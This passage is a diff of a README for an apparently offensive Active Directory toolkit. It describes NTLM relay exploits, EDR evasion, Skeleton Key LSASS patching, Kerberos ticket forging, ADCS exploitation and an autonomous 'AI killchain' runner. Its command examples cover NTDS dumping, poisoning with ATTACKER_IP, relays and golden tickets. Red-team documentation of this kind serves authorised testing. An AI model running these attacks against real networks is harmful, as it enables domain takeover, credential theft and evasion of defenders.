-| **Exchange NTLM Relay** | `relay/src/exchange.rs` | Full Exchange relay target (CVE-2024-21410): NTLM relay to MAPI-over-HTTP and EWS endpoints with TLS support, self-signed certificate acceptance, channel binding stripping (EPA bypass), configurable Exchange version (2013/2016/2019/Online/AutoDetect). 455 lines of production relay code. |
+| **ADCS ESC1 + ESC6** | `core/src/adcs/esc{1,6}.rs` | Full exploiters - SAN UPN abuse, CSR, enrollment, hash extraction, EDITF flag abuse. |
+| **LDAP signing bypass** | `relay/src/relay.rs` | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL/ALWAYS_SIGN from CHALLENGE before victim sees it, zeroes MIC in AUTHENTICATE. Post-relay LDAP operations work on the relayed session. |
+| **WASM plugin system** | `core/src/plugin/loader.rs` | State persistence, manifest section parsing, `allocate()` export support, `fn_free` fallback. WASM plugins have long-term memory now. |
+| **CLI PDF + C2 + TUI wiring** | `cli/src/commands_impl.rs`, `tui/runner.rs` | PDF reports, C2 implant deploy, TUI crawler - all actually call real code now. |
+| **WinRM Windows output** | `core/src/exec/winrm/windows.rs` | `WSManReceiveShellOutput` loop collects real output. |
+| **Session resume + TOML config** | `cli/src/main.rs`, `pilot/src/runner.rs` | `--resume <file>` picks up mid-chain. `--config <file>` loads DC, domain, auth, stealth, jitter from TOML. |
+| **Credential Vault** | `core/src/lib.rs` (`CredStore`) | Thread-safe, privilege-ranked (DA > EA > Local Admin > Service > User), surfaced in the final auto-pwn report. |
+| **OPSEC Noise Gate** | `pilot/src/runner.rs` | `--stealth` caps the noise budget at `Medium`. High/Critical-noise steps are skipped and logged. |
+| **Skeleton Key native DLL** | `tools/skeleton_key/`, `core/src/postex/skeleton_key_dll.rs` | 92KB x64 MSVC-compiled DLL with `MsvpPasswordValidate` hook. Embedded as Rust const bytes. Exports: Enable/Disable/IsActive. |
+| **EDR Evasion Module** | `core/src/postex/edr_bypass.rs` | 1,575-line next-gen stealth: EDR detection (22 vendors), ntdll unhooking, ETW abolition, syscall resurrection, sleep masking. |
+| **Credential Guard Remote Detection** | `core/src/postex/cg_check.rs` | Multi-signal CG detection: SMB registry + WMI + LDAP + heuristic weighted voting. Windows-2025-aware. |
+| **Azure AD / Entra ID Hybrid Operations** | `core/src/azure_ad.rs` | 8 total Azure AD attack operations including ManagedIdentityToken, EntraConnectExtract, AppRegistrationAbuse, DeviceCodePhish. |
+| **Exchange NTLM Relay** | `relay/src/exchange.rs` | CVE-2024-21410: NTLM relay to MAPI-over-HTTP and EWS endpoints with EPA bypass. |
+| **TCP source-port rotation** | `crawler/src/pacing.rs` | `PortRotator` with atomic round-robin, `connect_with_source_port()`, `connect_with_rotation()` fallback. No admin needed (ports >= 1024). 12 tests. |
+| **JA3/JA4 TLS fingerprint randomization** | `crawler/src/tls_fingerprint.rs` | `TlsFingerprintConfig` with cipher/group randomization. Danger + verified config builders. Feature-gated. 9 tests. |
+| **SMB OPLOCK hijacking** | `core/src/proto/smb2.rs`, `crawler/src/oplock.rs` | `create_with_oplock()`/`wait_for_oplock_break()`/`acknowledge_oplock_break()` in SMB2. `OplockConfig`/`OplockLevel`/`OplockSession` in crawler. |
+| **Responder integration** | `crawler/src/responder.rs` | `CrawlerResponder` wraps relay Poisoner + Responder. CLI `--poison-ip`/`--respond` on `ovt move`. Feature-gated. 9 tests. |
+| **Snaffler module audit** | `reaper/src/snaffler.rs` | `SnafflerConfig`, `SnaffleFinding`, CSV export, SMB error handling fixed, tests expanded 11->23. |
+| **LAPS/gMSA enumeration** | `reaper/src/laps_gmsa.rs` | Purpose-built enumeration for LAPS passwords and gMSA account secrets. 276 lines, 12 tests. |
+| **HTTP->SMB asymmetric relay** | `relay/src/http_asymmetric.rs` | Full HTTP request capture and replay. `CapturedHttpRequest`, `HttpAsymmetricRelay`. 13 tests. |
+| **IPv6 transport** | `relay/src/utils.rs` | `bind_tcp_listener_async/sync` helpers, centralized `format_addr()`. 16 IPv6 tests. |
+| **mTLS / TLS verification mode** | `relay/src/tls.rs` | `TlsVerificationMode` (AcceptAll/VerifyServerCert), `TlsConfig` struct, `--tls-verify` CLI flag on all relay subcommands. 22 tests. |
+| **Auto-trigger coercion** | `relay/src/lib.rs` | `auto_coerce()` with `CoerceCreds` passthrough, ShadowCoerce (WebDAV), `wait_for_listener_ready()`. |
+| **CLI config file loading** | `cli/src/cli_config.rs` | TOML XDG-style config, 1111 lines, 39 tests. `ovt config` subcommand with 8 actions. |
+| **CLI profile system** | `cli/src/cli_config.rs` | Named profiles, `OT_CONFIG`/`OT_PROFILE` env support, 9 subcommands, 31 tests. |
+| **Interactive shell (REPL)** | `cli/src/interactive_shell.rs` | 3263 lines, rustyline, tab completion, forge modules, WinRM/SMB/WMI shell types. |
+| **Session management CLI** | `pilot/src/session.rs`, `cli/src/commands/session.rs` | `ovt session` with 7 actions (list/show/info/delete/clean/path/stats). `--from-session` wired to wizard. |
+| **Sapphire Ticket** | `forge/src/sapphire.rs` | Legitimate TGT -> S4U2Self -> decrypt -> extract KDC-issued PAC -> forge new TGT with krbtgt encryption. |
+| **Enhanced Diamond** | `forge/src/diamond.rs` | Parses legitimate PAC, preserves KDC checksum (type 7). KDC_ISSUED indicator survives. |
+| **ADCS Dispatcher** | `forge/src/adcs_dispatcher.rs` | 1147 lines, ESC1-9 orchestration, Auto mode (ESC1->ESC6->ESC9). 9 tests. |
+| **S4U2Self with PKINIT Chain** | `forge/src/s4u2self_pkinit.rs` | Certificate-based S4U2Self delegation. `ForgeAction::S4u2SelfPkinit`. |
+| **AS-REP to TGT Pipeline** | `forge/src/runner.rs` | `ForgeAction::AsRepToTgt` takes cracked AS-REP passwords, requests real TGTs from KDC. |
+| **PKINIT-keyed InterRealmTgt + SkeletonKey** | `forge/src/interrealm.rs`, `forge/src/skeleton.rs` | PKINIT session key as trust key for cross-realm TGT forging and SMB auth for skeleton key. |
+| **MS-WCCE DCOM (ESC8)** | `forge/src/ms_wcce_dcom.rs` | Full DCOM activation path for ICertRequest remote enrollment. 30 tests. |
+| **Credential Guard bypass** | `core/src/postex/lsaiso.rs` | 3-tier: ALPC -> process memory via raw syscalls -> WDigest fallback. 1762 lines, 25 tests. |
+| **DPAPI masterkey extraction** | `core/src/postex/dpapi_extract.rs` | Masterkey decryption from lsass, offline decryption support. 447 lines, 21 tests. |
+| **File-format-aware carver** | `core/src/postex/file_carver.rs` | Carves secrets from docx/xlsx/etc. 720 lines. |
+| **DCE/RPC signature stripping** | `core/src/proto/ntlm.rs` | `strip_dce_rpc_signature` -- strips NTLM auth verifier from DCE/RPC request PDUs. 10 tests. |
 
 ### ? Still Pending
 
 No sugarcoating. These are genuinely not done.
 
 | What | Why It Matters | Status | Notes |
-|---|---|---|---|---|
-| **Live DC integration tests** | "It compiles" and "it works against a real DC" are two very different sentences. | ? Not yet | Unit tests pass. Property-based tests pass. Nobody has run this against GOAD or a real lab yet. The bravery check is still scheduled. |
-| **LDAP signing "Require" mode** | When the DC enforces `LdapServerIntegrity = 2`, the "Drop the MIC" technique isn't enough - the server demands signed LDAP messages for every operation. | ?? Partial | Bypass works when policy is "Negotiate". When "Require", we'd need the session key to sign messages - can't derive in relay scenario. `ovt doctor` tells you which mode the DC uses. |
-| **EDR evasion CLI integration** | The full EDR evasion library exists (1,575 lines) but has no `ovt edr` command. | ?? CLI only | Library: `edr_bypass.rs` - EDR detection, ntdll unhooking, ETW abolition, sleep masking. Needs CLI wiring. |
-| **CG check CLI integration** | Multi-signal CG detection exists but no `ovt cg` command. | ?? CLI only | Library: `cg_check.rs` - SMB registry + WMI + LDAP domain + heuristic weighted voting. Needs CLI wiring. |
-| **4 Azure AD ops CLI** | 4 of 8 Azure AD operations lack CLI subcommands. | ?? CLI only | Missing: ManagedIdentityToken, EntraConnectExtract, AppRegistrationAbuse, DeviceCodePhish. Library code exists. |
-| **Exchange relay CLI** | Exchange relay module exists but is not exposed in the CLI's relay subsystem. | ?? CLI only | Programmatic use from hunter crate works. No `ovt ntlm exchange` command. |
+|---|---|---|---|---|---|
+| **Live DC integration tests** | "It compiles" and "it works against a real DC" are two very different sentences. | ? Not yet | Unit tests pass. Nobody has run this against GOAD or a real lab yet. The bravery check is still scheduled. |
+| **LDAP signing "Require" mode** | When the DC enforces `LdapServerIntegrity = 2`, the "Drop the MIC" technique isn't enough - the server demands signed LDAP messages for every operation. | ?? Partial | Bypass works when policy is "Negotiate". When "Require", can't derive session key in relay scenario. `ovt doctor` tells you which mode the DC uses. |
+| **EDR evasion CLI integration** | `ovt edr assess` / `ovt edr evade` already wired via `EdrAction`. Library: `edr_bypass.rs` - 2,127 lines, 25 tests. | ✅ Wired | Fully integrated CLI. EDR assessment + stealth profile application. |
+| **CG check CLI integration** | Multi-signal CG detection (`ovt cg <target>`) already wired via `CgAction`. | ✅ Wired | Fully integrated CLI. Credential Guard detection with multiple signal sources. |
+| **4 Azure AD ops CLI** | All 8 Azure AD operations have CLI subcommands (Enum, SeamlessSso, GoldenSaml, PrtTheft, ManagedIdentityToken, EntraConnectExtract, AppRegistrationAbuse, DeviceCodePhish). | ✅ Wired | Library code exists for all 8, CLI wired for all 8. SeamlessSSO/GoldenSAML need end-to-end flow testing. |
+| **Exchange relay CLI** | Exchange relay (`ovt ntlm exchange`) already wired in CLI relay subsystem. | ✅ Wired | Fully integrated with `--tls-verify` and `--tls-cert`/`--tls-key` flags. |
 | **SMBDaemon** | A dedicated SMB server for capturing credentials outside of responder. | ? Not yet | Does not exist anywhere in the codebase. |
 | **WmiExec on Linux/macOS** | WMI requires DCOM which requires Windows COM infrastructure. | ?? Windows only | Use `--method psexec` or `--method smbexec` on Linux. |
+| **Azure AD Seamless SSO + Golden SAML** | Full Azure AD Kerberos/SAML integration - the big cloud-AD gap. | ? Not yet | Azure AD ops exist but no full Seamless SSO or Golden SAML end-to-end flows. |
+| **Ticket encryption rotation** | Re-encrypt a forged ticket under a different krbtgt key without forging again. | ? Not yet | Feature request, not a blocker. |
+| **Viewer WebSocket** | Live graph updates without page reload. | ? Not yet | Largest UX improvement per effort. |
 
 ## Does It Actually Work?
 
@@ -357,7 +396,7 @@ Yes. Here's proof. One table. Every major feature. Every target OS you care abou
 
 > ⚠️ = works, but WS 2025 security defaults are spicy: LDAP signing is required by default on new AD deployments, LDAP channel binding is audited/encouraged, SMB signing is required by default for outbound connections, and NTLM blocking exists to ruin relay goblin dreams. `ovt doctor` tells you what terrain you're standing on before you sprint into a wall.
 
-~152,000 lines of Rust across 10 crates (~160,000 total tracked source/doc/static lines). Zero Python wrappers. Minimal shell-outs where strictly needed. `cargo test --workspace --lib` exercises over 450 library tests across core, reaper, hunter, crawler, forge, relay, scribe, pilot, and viewer code paths, with integration tests covering graph, C2, module execution, and live DC infrastructure. The code is real. The protocols are real. Go break some labs.
+~160,000 lines of Rust across 9 crates (~175,000 total tracked source/doc/static lines). Zero Python wrappers. Minimal shell-outs where strictly needed. `cargo test --workspace --lib` exercises **1,618 library tests** across core, reaper, hunter, crawler, forge, relay, scribe, pilot, and viewer code paths, with integration tests covering graph, C2, module execution, and live DC infrastructure. The code is real. The protocols are real. Go break some labs.
 
 ## Commands
 
@@ -368,29 +407,46 @@ Yes. Here's proof. One table. Every major feature. Every target OS you care abou
 **Quick taste:**
 
 ```bash
-ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full AI killchain
-ovt auto-pwn --config ./eng.toml --resume session.json  # Resume with config
-ovt wizard   -t DA --dc-host DC -d DOMAIN -u USER      # Guided mode
-ovt enum all -H DC -d DOMAIN -u USER -p PASS            # Enumerate everything
-ovt enum policy -H DC -d DOMAIN -u USER -p PASS         # Lockout/password policy
-ovt enum laps -H DC -d DOMAIN -u USER -p PASS           # Readable LAPS secrets
+ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS                        # Full AI killchain
+ovt auto-pwn --config ./eng.toml --resume session.json               # Resume with config
+ovt wizard   -t DA --dc-host DC -d DOMAIN -u USER                   # Guided mode
+ovt shell                                                            # Interactive REPL
+ovt enum all -H DC -d DOMAIN -u USER -p PASS                        # Enumerate everything
+ovt enum policy -H DC -d DOMAIN -u USER -p PASS                     # Lockout/password policy
+ovt enum laps -H DC -d DOMAIN -u USER -p PASS                       # Readable LAPS secrets
 ovt powerview users --identity adm-smith -H DC -d DOMAIN -u USER -p PASS
-ovt guid resolve ForceChangePassword                    # Resolve common ACE GUIDs
-ovt snaffler -H DC -d DOMAIN -u USER -p PASS --output-format json -O snaffle.json
-ovt scan --targets DC --ldap --smb                      # No-creds port + null-session triage
-ovt enum pre -H DC                                      # No-creds AD service triage
-ovt enum anonymous -H DC                                # Anonymous LDAP RootDSE probe
-ovt kerberos user-enum -H DC -d DOMAIN --userlist users.txt   # Zero-knowledge user enum
-ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS      # Kerberoast
-ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN       # Remote exec
-ovt dump -t DC ntds -d DOMAIN -u DA -p PASS --output-format json -O ntds.json
-ovt adcs enum -H DC -d DOMAIN -u USER -p PASS            # ADCS vuln scan
-ovt graph gui -i ./graphs/                               # Browser GUI; blank-first search/chunk render
-ovt doctor                                                # Health check
-ovt azure enum -H DC -d DOMAIN -u USER -p PASS            # Hybrid identity + Entra enumeration
-ovt azure golden-saml -H DC -d DOMAIN -u DA -p PASS       # Golden SAML forge via ADFS cert
-ovt azure seamless-sso -H DC -d DOMAIN -u USER -p PASS    # Seamless SSO → OAuth token abuse
-ovt completions bash                                      # Shell tab completion
+ovt guid resolve ForceChangePassword                                # Resolve common ACE GUIDs
+ovt snaffler -H DC -d DOMAIN -u USER -p PASS --output-format json   # Snaffle network shares
+ovt scan --targets DC --ldap --smb                                  # No-creds port + null-session triage
+ovt enum pre -H DC                                                   # No-creds AD service triage
+ovt enum anonymous -H DC                                             # Anonymous LDAP RootDSE probe
+ovt kerberos user-enum -H DC -d DOMAIN --userlist users.txt         # Zero-knowledge user enum
+ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS                  # Kerberoast
+ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN                   # Remote exec
+ovt dump -t DC ntds -d DOMAIN -u DA -p PASS --output-format json    # DCSync
+ovt adcs enum -H DC -d DOMAIN -u USER -p PASS                       # ADCS vuln scan
+ovt graph gui -i ./graphs/                                           # Browser GUI
+ovt graph view -i ./bloodhound-json/                                 # Native TUI graph viewer
+ovt graph tree -i ./bloodhound-json/                                 # Native TUI tree explorer
+ovt doctor                                                           # Health check
+ovt config show                                                      # Show config
+ovt config set verbose true                                          # Set config value
+ovt config profile create cobalt-op                                  # Create named profile
+ovt config profile use cobalt-op                                     # Activate a profile
+ovt session list                                                     # List saved sessions
+ovt session show corp.local-10.0.0.1                                 # Show session details
+ovt session clean --older-than 30d                                   # Clean old sessions
+ovt move -H DC -d DOMAIN -u USER -p PASS --respond --poison-ip ATTACKER_IP  # Crawl + respond
+ovt ntlm http-asymmetric -t http://target:80 -p 8080                # HTTP→SMB asymmetric relay
+ovt ntlm relay -l 0.0.0.0:8080 -t smb://target --tls-verify         # NTLM relay with TLS verify
+ovt ntlm smb-relay -l 0.0.0.0:445 -t ldap://target                  # SMB→LDAP relay
+ovt azure enum -H DC -d DOMAIN -u USER -p PASS                      # Hybrid identity + Entra
+ovt azure golden-saml -H DC -d DOMAIN -u DA -p PASS                 # Golden SAML forge
+ovt azure seamless-sso -H DC -d DOMAIN -u USER -p PASS              # Seamless SSO
+ovt forge golden --domain-sid S-1-5-... --krbtgt-hash <hash>        # Forge golden ticket
+ovt forge adcs --ca-server CA01.corp.local --domain corp.local      # ADCS ESC1-9 auto-exploit
+ovt forge s4u2self-pkinit -d DOMAIN --cert cert.pfx                 # S4U2Self with PKINIT
+ovt completions bash                                                 # Shell tab completion
 ```
 
 ---
@@ -412,6 +468,8 @@ The "ask nicely and receive everything" phase. Active Directory is the most over
 | **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. | ✅ Done |
 | **Account telemetry** | `badPwdCount`, `badPwdTime`, `lockoutTime`, logon count, password timestamps, and account expiry. This is what makes safe spray planning possible instead of vibes-based credential roulette. | ✅ Done |
 | **LAPS discovery** | LAPS v1 (plaintext ms-Mcs-AdmPwd) and LAPS v2 - including the encrypted variant (msLAPS-EncryptedPassword) via DPAPI/AES-256-GCM decryption. The DPAPI module finally exists. Hallelujah. | ✅ Full (v1 + v2 encrypted) |
+| **LAPS/gMSA enumeration** | Purpose-built `laps_gmsa.rs` (276 lines, 12 tests) - targets LAPS passwords and gMSA account secrets specifically. No more generic LDAP scraping. | ✅ Full |
+| **Snaffler module** | `snaffler.rs` - configurable share crawling with pattern matching (extensions/names/regex), severity scoring, CSV export, concurrent scanning. Audited and fixed. 23 tests. | ✅ Full |
 | **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. | ✅ Done |
 | **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell. SQL Server: because every network needs a database with `sa:sa` credentials. | ✅ Full TDS client |
 | **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions, vulnerable template identification. ADCS is the gift that keeps on giving (to attackers). | ✅ Done |
@@ -432,6 +490,23 @@ The crate with zero stubs. The only crate that did all its homework. If overthro
 | **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine. It's always the print server. Always. | ✅ Full |
 | **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback. | ✅ Full |
 | **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats. Tickets are the currency of AD. This module is the money printer. | ✅ Full |
+
+### Cross-Domain Crawling (overthrone-crawler)
+
+The explorer crate that used to have placeholder "not yet implemented" functions. Now it's the Indiana Jones of AD reconnaissance.
+
+| Feature | Details | Status |
+|---|---|---|
+| **Cross-domain trust mapping** | Parent/child, cross-forest, external, realm trusts. Maps who trusts whom across boundaries. | ✅ Full |
+| **Inter-realm TGT forging** | Forge cross-realm TGTs using trust keys or PKINIT session keys. | ✅ Full |
+| **SID filter analysis** | Detects SID filter misconfigurations that enable cross-domain escalation. | ✅ Full |
+| **PAM trust detection** | Privileged Access Management trust detection. | ✅ Full |
+| **MSSQL linked server crawling** | Crawl linked MSSQL servers via TDS protocol, execute queries across boundaries. | ✅ Full |
+| **Foreign LDAP enumeration** | Real cross-trust LDAP queries: users, groups, computers, SPNs, ACLs. 25KB of `foreign.rs`. | ✅ Full |
+| **TCP source-port rotation** | `PortRotator` - atomic round-robin across user-port range (49152-65535), `connect_with_source_port()`, `connect_with_rotation()` with OS fallback. No admin needed. 12 tests. | ✅ Full |
+| **JA3/JA4 TLS fingerprint randomization** | `TlsFingerprintConfig` - randomize cipher order, group order, cipher subset size. Danger + verified config builders. Feature-gated. 9 tests. | ✅ Full |
+| **SMB OPLOCK hijacking** | `OplockConfig`/`OplockLevel`/`OplockSession` in `oplock.rs`. Create/wait/acknowledge break cycle. Used for SMB share crawling. | ✅ Full |
+| **Responder integration** | `CrawlerResponder` wraps relay Poisoner + Responder with start/stop lifecycle. CLI `--poison-ip`/`--respond` on `ovt move`. Captured NTLMv2 displayed as hashcat-ready. 9 tests. | ✅ Full |
 
 ### Attack Graph (overthrone-core)
 
@@ -480,16 +555,22 @@ The browser GUI runs a local Rust HTTP server, opens a tab automatically, and se
 
 ### NTLM Relay & Poisoning (overthrone-relay)
 
-Born complete. Zero stubs. The prodigy crate that showed up on day one and said "I'm not here to play, I'm here to win."
+Born complete. Stayed complete. Added more features just to flex. Still zero stubs.
 
 | Feature | Details | Status |
 |---|---|---|---|
 | **NTLM Relay Engine** | Full relay - capture NTLM auth from one protocol, replay to another. SMB→LDAP, HTTP→SMB, mix and match like a deadly cocktail. | ✅ Full |
+| **HTTP→SMB Asymmetric Relay** | `http_asymmetric.rs` - full HTTP request capture and replay. Captures method/URI/headers/body, extracts NTLM token, replays authenticated request to target. Connection-based state tracking (NAT-safe). Post-auth modes for HTTP/HTTPS/WebDAV/Exchange vs SMB/LDAP/MSSQL. CLI: `ovt ntlm http-asymmetric`. | ✅ Full |
 | **Exchange Relay** | CVE-2024-21410 - NTLM relay to Exchange MAPI-over-HTTP and EWS endpoints. TLS support, self-signed cert acceptance, EPA/channel binding bypass. Pre-CU14 Exchange servers accept relayed NTLM auth without Extended Protection. | ✅ Full |
-| **SMB Signing Pre-Flight** | Inline SMB2 negotiate probe checks `SecurityMode` before relaying. If the target requires packet signing, relay refuses with a clear error. No silent failures. | ✅ Full |
-| **LDAP Signing Bypass** | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL flags from the target's CHALLENGE before the victim sees it, zeroes MIC in AUTHENTICATE. Relayed sessions can perform LDAP operations (add-to-group, search, modify-replace). Works when DC signing policy is "Negotiate." | ✅ Full |
+| **SMB Signing Pre-Flight** | Inline SMB2 negotiate probe checks `SecurityMode` before relaying. If the target requires packet signing, relay refuses with a clear error. | ✅ Full |
+| **LDAP Signing Bypass** | CVE-2019-1040 "Drop the MIC" - strips SIGN/SEAL flags from the target's CHALLENGE before the victim sees it, zeroes MIC in AUTHENTICATE. Relayed sessions can perform LDAP operations (add-to-group, search, modify-replace). | ✅ Full |
+| **DCE/RPC Signature Stripping** | `strip_dce_rpc_signature` in core - strips NTLM auth verifier from DCE/RPC request PDUs. Wired in `smb_daemon.rs::relay_ioctl()`. Enables relay against MS-RPRN and MS-EFSR. | ✅ Full |
+| **mTLS / TLS Verification Mode** | `TlsVerificationMode` enum (AcceptAll/VerifyServerCert), `TlsConfig` struct. Unified `wrap_tls()` across relay engine + exchange module. `--tls-verify` flag on all relay subcommands. Channel binding validation (CbtMode::Validate/Strip/Passthrough). | ✅ Full |
+| **Auto-Trigger Coercion** | `auto_coerce()` with `CoerceCreds` passthrough for authenticated coercion. ShadowCoerce (PetitPotam via WebDAV) when HTTP relay active. `wait_for_listener_ready()` with exponential backoff. CLI: `--auto-coerce-domain/user/password`. | ✅ Full |
+| **IPv6 Transport** | `bind_tcp_listener_async/sync` helpers for dual-stack listeners. Fixed IPv6 target address formatting. Centralized `format_addr()` with bracket handling. | ✅ Full |
+| **SOCKS5 Proxy Output** | Route relayed connections through SOCKS5 proxy. Wired in ADCS relay, Exchange relay, SMB daemon. | ✅ Full |
 | **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ Full |
-| **Network Poisoner** | Decides when to poison, what to poison, and how aggressively - while avoiding detection. Subtlety is an art form. | ✅ Full |
+| **Network Poisoner** | Decides when to poison, what to poison, and how aggressively - while avoiding detection. | ✅ Full |
 | **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ Full |
 
 ### Persistence (overthrone-forge)
@@ -502,12 +583,21 @@ Taking the throne is easy. Keeping it is an art form. This crate welds the crown
 | **Golden Ticket** | Forge a TGT signed with the KRBTGT hash. Be any user. Access anything. The Willy Wonka golden ticket, except the factory is Active Directory. | ✅ Full (with PAC construction) |
 | **Silver Ticket** | Forge a TGS for any service. Stealthier than Golden - no DC interaction needed. | ✅ Full |
 | **Diamond Ticket** | Modify a legit TGT's PAC. Bypasses detections that check for TGTs not issued by the KDC. The stealth bomber of ticket forging. | ✅ Full |
+| **Enhanced Diamond** | Parses legitimate TGT PAC, locates and preserves KDC checksum (type 7). KDC_ISSUED indicator survives inspection. | ✅ Full |
+| **Sapphire Ticket** | Full chain: legitimate TGT -> S4U2Self -> decrypt service ticket -> extract KDC-issued PAC -> forge new TGT around it with krbtgt encryption. The phoenix of ticket attacks. | ✅ Full |
+| **Bronze Bit** | CVE-2020-17049 - S4U2Self -> S4U2Proxy with PA-PAC-OPTIONS forwardable flag bypass. | ✅ Full |
+| **InterRealm TGT** | Forge cross-realm TGTs with PKINIT session key or trust hash. Move between forests like you pay taxes in both. | ✅ Full |
+| **PKINIT-Keyed Forging** | Golden/Silver/Diamond/InterRealm/Skeleton Key all check `pkinit_session_key` first, fall back to hash. Certificate-based forging, no krbtgt hash required. | ✅ Full |
+| **ADCS Dispatcher** | ESC1-9 orchestration in 1,147 lines. Auto mode tries ESC1->ESC6->ESC9 in order. Direct exploit for ESC1/2/3/6/9, command generation for ESC4/5/7/8. | ✅ Full |
+| **S4U2Self with PKINIT Chain** | Certificate-based S4U2Self delegation. PKINIT auth -> S4U2Self -> optional S4U2Proxy. Wired as `ForgeAction::S4u2SelfPkinit`. | ✅ Full |
+| **AS-REP to TGT Pipeline** | Takes cracked AS-REP passwords, requests real TGTs from KDC. `ForgeAction::AsRepToTgt`. | ✅ Full |
 | **Shadow Credentials** | Add a key credential to msDS-KeyCredentialLink via LDAP, then authenticate with PKINIT (real RSA signing + DH key exchange). The cool modern attack, and it actually works now. | ✅ Full (LDAP + PKINIT) |
 | **ACL Backdoor** | Modify DACLs to grant yourself hidden permissions. The "I was always an admin, you just didn't notice" technique. | ✅ Full |
-| **Skeleton Key** | Patch LSASS to accept a master password. Native 92KB x64 DLL embedded in binary. Reflective injection via `CreateRemoteThread`. Exports: `SkeletonKey_Enable`, `SkeletonKey_Disable`, `SkeletonKey_IsActive`. Full orchestration: SMB connect ? admin check ? inject ? cleanup. | ✅ Full (native DLL) |
+| **MS-WCCE DCOM (ESC8)** | Full DCOM activation path for ICertRequest remote enrollment. 30 tests. The direct COM pipe, no web enrollment needed. | ✅ Full |
+| **Skeleton Key** | Patch LSASS to accept a master password. Native 92KB x64 DLL embedded in binary. Reflective injection via `CreateRemoteThread`. Exports: Enable/Disable/IsActive. Full SMB orchestration. PKINIT-based auth path for certificate-based SMB session. | ✅ Full (native DLL) |
 | **DSRM Backdoor** | Set DsrmAdminLogonBehavior=2 via remote registry. Persistent backdoor via DSRM Administrator. | ✅ Full |
 | **Forensic Cleanup** | Rollback every persistence technique. Because good pentesters clean up. Great pentesters never needed to. | ✅ Full |
-| **Validation** | Verify persistence actually works post-deployment. Trust but verify. (Actually, just verify. This is offensive security.) | ✅ Full |
+| **17 ForgeAction Variants** | Golden, Silver, Diamond, EnhancedDiamond, Sapphire, BronzeBit, InterRealmTgt, SkeletonKey, DsrmBackdoor, DcSyncUser, AclBackdoor, NoPac, ConvertTicket, AsRepToTgt, PkinitAuth, AdcsExploit, S4u2SelfPkinit. Pick your poison. | ✅ Full |
 
 ### ADCS Exploitation (overthrone-core)
 
@@ -583,23 +673,26 @@ The layer that used to be the "Empty Files Hall of Shame." The shame has been re
 
 ### Autonomous Planning (overthrone-pilot)
 
-The "I'll hack it myself" engine. Now with machine learning.
+The "I'll hack it myself" engine. Now with machine learning and a filing system.
 
 | Feature | Status |
 |---|---|
 | **Attack Planner** | ✅ Plans multi-step attack chains from enumeration data |
 | **Step Executor** | ✅ Executes each planned step by calling Hunter/Forge/Reaper. 90KB of execution logic. |
 | **Adaptive Strategy** | ✅ Adjusts plan on-the-fly based on what succeeds and fails |
-| **Policy-Aware Planning** | ✅ Pulls password policy, badPwdCount/badPwdTime/lockoutTime, GPOs, delegation/RBCD, and readable LAPS before choosing attacks. Password spray uses one policy-compatible candidate and skips accounts near lockout. |
-| **Q-Learning AI** | ✅ Reinforcement learning engine (compiled by default) - e-greedy policy with decay (0.3→0.05), learns optimal attack sequences across engagements via state-action reward tables. State now includes policy, lockout risk, LAPS, delegation, GPO, creds, admin hosts, roasting targets, stage, action family, stealth, and failure class. Shows state, decision, Q-value, rationale, and reward at every step. |
+| **Policy-Aware Planning** | ✅ Pulls password policy, badPwdCount/badPwdTime/lockoutTime, GPOs, delegation/RBCD, and readable LAPS before choosing attacks. |
+| **Q-Learning AI** | ✅ Reinforcement learning engine (compiled by default) - e-greedy policy with decay (0.3→0.05), learns optimal attack sequences across engagements via state-action reward tables. State includes policy, lockout risk, LAPS, delegation, GPO, creds, admin hosts, stage, action family, stealth, and failure class. Shows state, decision, Q-value, rationale, and reward at every step. |
 | **Goal System** | ✅ Target DA, Enterprise Admin, specific user, specific host |
 | **Playbooks** | ✅ Pre-built YAML attack sequences for common scenarios |
-| **Wizard Mode** | ✅ Interactive guided mode for manual control with autopilot assist and the same Q-learner state/decision/reward loop as auto-pwn. |
-| **Session Resume** | ✅ `--resume <file>` reloads serialized `EngagementState` from a previous run. VPN dropped? Pick up mid-chain from the exact step where you left off. |
-| **TOML Config** | ✅ `--config <file>` loads engagement params from a TOML file. Set DC, domain, auth, targets, adaptive mode, jitter, and more without repeating flags every run. |
-| **Credential Vault** | ✅ Thread-safe in-process credential store (`CredStore`) with privilege ranking. Discovered credentials are ranked DA > Enterprise Admin > Local Admin > Service > Domain User and surfaced in the final report. |
-| **OPSEC Noise Gate** | ✅ `--stealth` caps the noise budget at `Medium`. Steps rated `High` or `Critical` noise are skipped automatically. Every skipped step is logged in the audit trail. |
-| **Auto-Pwn Runner** | ✅ Full engagement orchestrator: enum → graph → exploit → persist → report. Live kill-chain pipeline shows stage completion. Per-step output with noise level, priority, credential/host gains. 9-section final report: kill-chain visual, per-stage stats, goal status, credential table, admin hosts, loot summary, Q-learner session stats, adaptive summary, audit trail. |
+| **Wizard Mode** | ✅ Interactive guided mode with Q-learner state/decision/reward loop. |
+| **Hostile-DC Detection** | ✅ `dc_verify.rs` - 5 checks: LDAP rootDSE, domain match, DNS SRV, hostname resolution, Kerberos port. |
+| **Session Management** | ✅ `ovt session` subcommand with 7 actions (list/show/info/delete/clean/path/stats). `--from-session <name>` wired to wizard - loads saved EngagementState, skips Enumerate if state has data. |
